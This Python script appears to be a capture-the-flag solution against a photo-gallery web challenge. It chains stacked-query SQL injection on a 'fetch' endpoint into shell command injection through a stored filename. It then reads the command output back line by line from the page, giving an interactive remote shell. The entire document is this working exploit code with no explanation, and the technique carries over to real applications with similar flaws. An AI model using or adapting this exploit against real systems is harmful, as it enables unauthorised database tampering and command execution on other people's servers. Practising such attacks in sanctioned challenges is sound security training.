import requests

# This needs to be changed to your challenge instance
url = "http://add.your.ip.address/containertag/"
fetch_url = f"{url}/fetch"


def main():
    while True:
        cmd = input("Enter command: ")
        execute_cmd(cmd)
        print()


def execute_cmd(cmd):
    go_on = True
    line_counter = 1
    while go_on:
        curr_cmd = cmd + f" | sed -n {line_counter}p"
        response = get_response_line(curr_cmd)
        got_valid_line = "0\\ttotal" not in response
        if got_valid_line:
            print(response)
            line_counter += 1
        go_on = got_valid_line


def get_response_line(curr_cmd):
    set_cmd_in_db(curr_cmd)
    response = str(requests.get(url).content)
    return response.split("<i>Space used: ")[1].split("</i>")[0]


def set_cmd_in_db(curr_cmd):
    get_param = f"1; UPDATE photos SET filename = 'files/adorable.jpg; {curr_cmd}' WHERE id=3; COMMIT;"
    requests.get(fetch_url, params={"id": get_param})


if __name__ == '__main__':
    main()
